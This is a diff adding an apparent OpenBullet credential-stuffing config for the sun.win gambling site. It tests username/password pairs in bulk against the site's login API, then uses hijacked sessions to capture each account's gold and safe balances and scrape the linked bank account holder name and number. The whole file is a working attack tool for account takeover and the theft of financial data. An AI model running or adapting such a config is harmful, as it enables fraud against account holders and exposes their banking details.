@@ -1,0 +1,179 @@
+[SETTINGS]
+{
+  "Name": "sum.win20",
+  "SuggestedBots": 499,
+  "MaxCPM": 0,
+  "LastModified": "2025-03-10T19:53:20.5409667+07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "thinhbul1",
+  "Version": "1.0.1 [CB]",
+  "Descriptions": "",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Hash MD5 "<USER><PASS>2kUHH2za4EuRjWGPk" -> VAR "hash" 
+
+FUNCTION GetRandomUA -> VAR "UA" 
+
+REQUEST POST "https://api.azhkthg1.net/id" 
+  CONTENT "{\"command\":\"loginHash\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"platformId\":2,\"advId\":\"\",\"deviceId\":\"\",\"hash\":\"<hash>\",\"sessionId\":\"\",brand\":\"sun.win\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Host: api.azhkthg1.net" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "signature" 
+  KEYCHAIN Failure OR 
+    KEY "TÃªn Ä‘Äƒng nháº­p hoáº·c máº­t kháº©u khÃ´ng Ä‘Ãºng" 
+    KEY "status\":101" 
+  KEYCHAIN Retry OR 
+    KEY "Báº¡n Ä‘Ã£ nháº­p sai máº­t kháº©u" 
+  KEYCHAIN Retry OR 
+    KEY "Unable to" 
+    KEY "<html" 
+
+PARSE "<SOURCE>" JSON "signature" -> VAR "signature" 
+
+PARSE "<SOURCE>" JSON "accessToken" -> VAR "accessToken" 
+
+PARSE "<SOURCE>" JSON "refreshToken" -> VAR "refreshToken" 
+
+PARSE "<SOURCE>" JSON "username" -> VAR "username" 
+
+PARSE "<SOURCE>" JSON "ipAddress" -> VAR "ipAddress" 
+
+PARSE "<SOURCE>" JSON "timestamp" -> VAR "timestamp" 
+
+PARSE "<SOURCE>" JSON "userId" -> VAR "userId" 
+
+REQUEST GET "https://api.azhkthg1.net/paygate?command=fetchTransactionSlipHistory&slipType=1&limit=5&skip=0" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "authorization: <accessToken>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "origin: https://web.sun.win" 
+  HEADER "pragma: no-cache" 
+  HEADER "priority: u=1, i" 
+  HEADER "referer: https://web.sun.win/" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" 
+
+SOCKETWEB Connect "wss://websocket.azhkthg1.net/websocket4" Redirection=TRUE EmitOnPing=TRUE -> CAP "HH" 
+
+SOCKETWEB Send "[1,\"Simms\",\"<username>\",\"<PASS>\",{\"info\":\"{\\\"ipAddress\\\":\\\"<ipAddress>\\\",\\\"userId\\\":\\\"<userId>\\\",\\\"username\\\":\\\"<username>\\\",\\\"timestamp\\\":<timestamp>,\\\"refreshToken\\\":\\\"<refreshToken>\\\"}\",\"signature\":\"<signature>\",\"pid\":4,\"subi\":true}]" -> CAP "n" 
+
+FUNCTION Delay "1000" -> VAR "Delay 1s" 
+
+SOCKETWEB Read -> VAR "Info" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<Info>" Contains "[]" 
+  KEYCHAIN Custom "ERRO" OR 
+    KEY "<Info>" Contains "Đã có lỗi xảy ra" 
+
+PARSE "<Info>" JSON "id" -> VAR "id" 
+
+FUNCTION Length "<id>" -> VAR "ID" 
+
+PARSE "<Info>" JSON "ph" -> VAR "ph" 
+
+PARSE "<Info>" JSON "gold" CreateEmpty=FALSE -> CAP "gold" 
+
+PARSE "<Info>" JSON "safe" CreateEmpty=FALSE -> CAP "safe" 
+
+PARSE "<SOURCE>" JSON "count" -> VAR "Nạp/Rút" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<ID>" DoesNotExist 
+    KEY "<gold>" DoesNotExist 
+
+REQUEST GET "https://api.azhkthg1.net/paygate?command=fetchBankAccounts" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "authorization: <accessToken>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "origin: https://web.sun.win" 
+  HEADER "pragma: no-cache" 
+  HEADER "priority: u=1, i" 
+  HEADER "referer: https://web.sun.win/" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "\"accountHolder\":\"" "\"" -> VAR "Namebank" 
+
+PARSE "<SOURCE>" LR "\"accountNo\":\"" "\"" -> VAR "STK" 
+
+!REQUEST GET "https://api.azhkthg1.net/sa?command=fetch-user-transaction2&limit=5&skip=0&assetName=gold" 
+!  
+!  HEADER "accept: */*" 
+!  HEADER "accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7" 
+!  HEADER "authorization: <accessToken>" 
+!  HEADER "cache-control: no-cache" 
+!  HEADER "origin: https://web.sun.win" 
+!  HEADER "pragma: no-cache" 
+!  HEADER "priority: u=1, i" 
+!  HEADER "referer: https://web.sun.win/" 
+!  HEADER "sec-ch-ua: \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"" 
+!  HEADER "sec-ch-ua-mobile: ?0" 
+!  HEADER "sec-ch-ua-platform: \"Windows\"" 
+!  HEADER "sec-fetch-dest: empty" 
+!  HEADER "sec-fetch-mode: cors" 
+!  HEADER "sec-fetch-site: cross-site" 
+!  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" 
+
+!PARSE "<SOURCE>" JSON "createdTime" -> VAR "createdTime" 
+
+!FUNCTION Compute "<createdTime> + 25200" -> VAR "createdTime" 
+
+!FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<createdTime>" -> CAP "Play" 
+
